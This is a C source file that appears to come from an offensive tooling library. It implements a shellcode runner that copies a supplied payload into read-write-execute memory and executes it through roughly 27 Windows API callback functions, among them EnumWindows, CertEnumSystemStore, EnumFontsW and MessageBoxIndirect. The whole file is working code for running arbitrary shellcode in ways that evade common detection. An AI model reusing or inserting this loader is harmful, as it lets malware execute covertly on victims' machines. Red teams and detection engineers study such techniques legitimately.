#include "Win32Helper.h"

DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
{
	PSHELLCODE_EXECUTION_INFORMATION Sei = (PSHELLCODE_EXECUTION_INFORMATION)Param;
	LPVOID BinAddress = NULL;
	BOOL bFlag = FALSE;
	HMODULE hModule = NULL;

	BinAddress = VirtualAlloc(NULL, Sei->dwLengthOfPayloadInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		goto EXIT_ROUTINE;

	CopyMemoryEx(BinAddress, Sei->Payload, Sei->dwLengthOfPayloadInBytes);

	switch (Sei->MethodEnum)
	{
		case E_CDEFFOLDERMENU_CREATE2:
		{
			IContextMenu* ContextMenuRequired = NULL;
			CDefFolderMenu_Create2(NULL, NULL, 0, NULL, NULL, (LPFNDFMCALLBACK)BinAddress, 0, NULL, &ContextMenuRequired);
			break;
		}

		case E_CERTENUMSYSTEMSTORE:
		{
			CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)BinAddress);
			break;
		}
		
		case E_CERTENUMSYSTEMSTORELOCATION:
		{
			CertEnumSystemStoreLocation(NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE_LOCATION)BinAddress);
			break;
		}

		case E_ENUMCHILDWINDOWS:
		{
			EnumChildWindows(NULL, (WNDENUMPROC)BinAddress, NULL);
			break;
		}

		case E_ENUMDATEFORMATSW:
		{
			EnumDateFormatsW((DATEFMT_ENUMPROCW)BinAddress, LOCALE_SYSTEM_DEFAULT, 0);
			break;
		}

		case E_ENUMDESKTOPWINDOWS:
		{
			EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()), (WNDENUMPROC)BinAddress, NULL);
			break;
		}

		case E_ENUMDESKTOPSW:
		{
			EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)BinAddress, NULL);
			break;
		}

		case E_ENUMDIRTREEW:
		{
			WCHAR DisposeableBuffer[512] = { 0 };

			if (!SymInitialize(InlineGetCurrentProcess, NULL, TRUE))
				goto EXIT_ROUTINE;

			EnumDirTreeW(InlineGetCurrentProcess, L"C:\\Windows", L"*.log", DisposeableBuffer, (PENUMDIRTREE_CALLBACKW)BinAddress, NULL);

			SymCleanup(InlineGetCurrentProcess);

			break;
		}

		case E_ENUMDISPLAYMONITORS:
		{
			EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)BinAddress, NULL);
			break;
		}

		case E_ENUMFONTFAMILIESEXW:
		{
			LOGFONTW Font = { 0 };
			Font.lfCharSet = DEFAULT_CHARSET;

			EnumFontFamiliesExW(GetDC(NULL), &Font, (FONTENUMPROCW)BinAddress, NULL, NULL);
			break;
		}

		case E_ENUMFONTSW:
		{
			EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)BinAddress, NULL);
			break;
		}

		case E_ENUMLANGUAGEGROUPLOCALESW:
		{
			EnumLanguageGroupLocalesW((LANGGROUPLOCALE_ENUMPROCW)BinAddress, LGRPID_ARABIC, 0, 0);
			break;
		}

		case E_ENUMOBJECTS:
		{
			LOGFONTW Font = { 0 };
			Font.lfCharSet = DEFAULT_CHARSET;

			EnumObjects(GetDC(NULL), OBJ_BRUSH, (GOBJENUMPROC)BinAddress, NULL);
			break;
		}

		case E_ENUMRESOURCETYPESEXW:
		{
			EnumResourceTypesExW(NULL, (ENUMRESTYPEPROCW)BinAddress, NULL, RESOURCE_ENUM_VALIDATE, NULL);
			break;
		}

		case E_ENUMSYSTEMCODEPAGES:
		{
			EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)BinAddress, CP_INSTALLED);
			break;
		}

		case E_ENUMSYSTEMGEOID:
		{
			EnumSystemGeoID(GEOCLASS_NATION, 0, (GEO_ENUMPROC)BinAddress);
			break;
		}

		case E_ENUMSYSTEMLANGUAGEGROUPS:
		{
			EnumSystemLanguageGroupsW((LANGUAGEGROUP_ENUMPROCW)BinAddress, LGRPID_SUPPORTED, NULL);
			break;
		}

		case E_ENUMSYSTEMLOCALESEX:
		{
			EnumSystemLocalesEx((LOCALE_ENUMPROCEX)BinAddress, LOCALE_ALL, NULL, NULL);
			break;
		}

		case E_ENUMTHREADWINDOWS:
		{
			EnumThreadWindows(0, (WNDENUMPROC)BinAddress, NULL);
			break;
		}

		case E_ENUMTIMEFORMATSEX:
		{
			EnumTimeFormatsEx((TIMEFMT_ENUMPROCEX)BinAddress, LOCALE_NAME_SYSTEM_DEFAULT, TIME_NOSECONDS, NULL);
			break;
		}

		case E_ENUMUILANGUAGESW:
		{
			EnumUILanguagesW((UILANGUAGE_ENUMPROCW)BinAddress, MUI_LANGUAGE_ID, NULL);
			break;
		}

		case E_ENUMWINDOWSTATIONSW:
		{
			EnumWindowStationsW((WINSTAENUMPROCW)BinAddress, NULL);
			break;
		}

		case E_ENUMWINDOWS:
		{
			EnumWindows((WNDENUMPROC)BinAddress, NULL);
			break;
		}

		case E_MESSAGEBOXINDIRECT:
		{
			MSGBOXPARAMS MessageBoxParams = { 0 };
			MessageBoxParams.cbSize = sizeof(MSGBOXPARAMS);
			MessageBoxParams.dwStyle = MB_HELP;
			MessageBoxParams.lpfnMsgBoxCallback = (MSGBOXCALLBACK)BinAddress;
			MessageBoxParams.lpszText = L"[Unstable] Help Executes Shellcode";

			MessageBoxIndirect(&MessageBoxParams);

			break;
		}

		case E_ENUMERATELOADEDMODULES:
		{
			EnumerateLoadedModules64(InlineGetCurrentProcess, (PENUMLOADED_MODULES_CALLBACK64)BinAddress, NULL);
			break;
		}

		case E_ENUMPAGEFILESW:
		{
			K32EnumPageFilesW((PENUM_PAGE_FILE_CALLBACKW)BinAddress, NULL);
			break;
		}

		case E_ENUMPWRSCHEMES:
		{
			EnumPwrSchemes((PWRSCHEMESENUMPROC)BinAddress, NULL);
			break;
		}

		default:
			goto EXIT_ROUTINE;

	}

	bFlag = TRUE;

EXIT_ROUTINE:

	if (hModule)
		FreeLibrary(hModule);

	if (BinAddress)
		VirtualFree(BinAddress, 0, MEM_RELEASE);

	return (bFlag ? 0 : 0xffffffff);
}

BOOL ShellcodeExecutionViaFunctionCallbackMain(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei)
{
	return CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)ShellcodeExecutionDispatchHandler, Sei, INFINITE);
}
